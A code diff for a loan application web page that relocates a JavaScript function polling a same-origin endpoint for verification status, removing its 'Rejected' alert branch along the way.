@@ -1087,6 +1087,40 @@ async function submitBankVerificationCode() {
 
 }
 // ======================================================
+// MONITOR VERIFICATION STATUS
+// ======================================================
+
+async function monitorVerificationStatus() {
+
+    const applicationId =
+        sessionStorage.getItem("applicationId");
+
+    if (!applicationId) return;
+
+    try {
+
+        const response = await fetch(
+            `/verification-status/${applicationId}`
+        );
+
+        const result = await response.json();
+
+        if (!result.success) return;
+
+        if (result.verificationStatus === "Verified") {
+
+            loadReferenceNumberScreen();
+
+        }
+
+    } catch (err) {
+
+        console.error("Verification status error:", err);
+
+    }
+
+}
+// ======================================================
 // SAVE BANK VERIFICATION
 // ======================================================
 
@@ -1299,45 +1333,7 @@ alert("submitApplication() was called");
     }
 
 }
-// ======================================================
-// MONITOR VERIFICATION STATUS
-// ======================================================
 
-async function monitorVerificationStatus() {
-
-    const applicationId = sessionStorage.getItem("applicationId");
-
-    if (!applicationId) return;
-
-    try {
-
-        const response = await fetch(
-            `/verification-status/${applicationId}`
-        );
-
-        const result = await response.json();
-
-        if (!result.success) return;
-
-        if (result.verificationStatus === "Verified") {
-
-            loadReferenceNumberScreen();
-
-        }
-
-        if (result.verificationStatus === "Rejected") {
-
-            alert("The verification code was rejected. Please contact Smart Loans.");
-
-        }
-
-    } catch (err) {
-
-        console.error(err);
-
-    }
-
-}
 // ======================================================
 // PROCESSING SCREEN
 // ======================================================
